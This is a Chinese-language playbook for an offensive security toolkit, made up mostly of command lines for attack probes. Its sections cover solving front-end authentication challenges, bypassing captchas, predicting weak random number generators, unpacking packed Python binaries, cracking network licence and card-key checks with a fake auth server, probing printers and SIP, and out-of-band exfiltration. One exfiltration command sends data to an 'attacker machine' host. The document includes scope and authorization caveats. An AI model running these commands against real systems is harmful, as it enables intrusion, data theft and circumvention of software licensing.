# 大爱仙尊专项探针作业手法

> 本库自己写的探针怎么跑。目标须在 scope 或带 `--case`。  
> 别名对不上专卡时先 `se_skill_alias.py`，再回到本页对应节。

## 档（共用）

写文件 / DNSlog / 随机 CD-Key / OPTIONS 无 SIP 行 **≠ 打穿**。  
改超管密、INVITE 轰炸、未授权扫打印机 / 未授权压测先停。

## 前端认证

```bash
python3 炼蛊房/frontend_auth_probe.py drive --base https://授权站 --case <案>
python3 炼蛊房/frontend_auth_probe.py altcha --challenge <hex> --salt <s> --max 200000
python3 炼蛊房/frontend_auth_probe.py rsa --n <modulus_hex> --e 10001 --text 'password'
```

L2 = 算出 Altcha number 或 RSA 密文。图验证码走 `captcha_auto.py ocr`，滑块走 `captcha_auto.py`。  
产物：`案卷/frontend_auth/surface.json`。

## 弱随机 / LCG

```bash
python3 炼蛊房/weak_rng_probe.py lcg --out <n1> --out <n2>
python3 炼蛊房/weak_rng_probe.py glibc --seed 1 --n 8
python3 炼蛊房/weak_rng_probe.py drive --path dump.txt --case <案>
```

内置 glibc / MSVC / Java / numerical。L2 = 对上下一个输出。BIP39 正规派生走 `wallet-core-reverse`。

## Python 打包

```bash
python3 炼蛊房/py_pack_reverse.py drive --path <样本> --case <案>
python3 炼蛊房/py_pack_reverse.py list --path <样本>
```

认 PyInstaller `MEI` cookie 或 Nuitka onefile。auth/license 串出现后交 `net_license_probe.py`。

## 网络验证 / 卡密

```bash
python3 炼蛊房/net_license_probe.py drive --path <样本> --case <案>
python3 炼蛊房/net_license_probe.py format --sample 'ABCD-1234-WXYZ' --sample 'EFGH-5678-QRST'
python3 炼蛊房/net_license_probe.py serve --host 127.0.0.1 --port 8765
```

假认证只绑回环。完整六步见 `卡密破禁.md`。

## 打印机 / SIP

```bash
python3 炼蛊房/printer_pjl_probe.py drive --host <授权IP> --case <案>
python3 炼蛊房/sip_surface_probe.py drive --host <授权IP> --case <案>
```

PJL：`@PJL INFO ID/STATUS` → :9100。SIP：单条 OPTIONS → :5060。网站案降权。禁止 INVITE 轰炸。

## OOB / 哈希 / 旧 JWT

```bash
python3 炼蛊房/oob_exfil.py dns --data id --domain oob.lab
python3 炼蛊房/oob_exfil.py http --data id --url http://攻击机:8080/
python3 炼蛊房/hash_identify.py --hash '$2a$10$...'
python3 炼蛊房/jwt_persist_probe.py drive --url https://授权/api/me --token '<旧票>' --case <案>
```

DNSlog ≠ GetShell。哈希识别 ≠ 爆破。旧票 200 才报无状态持久。
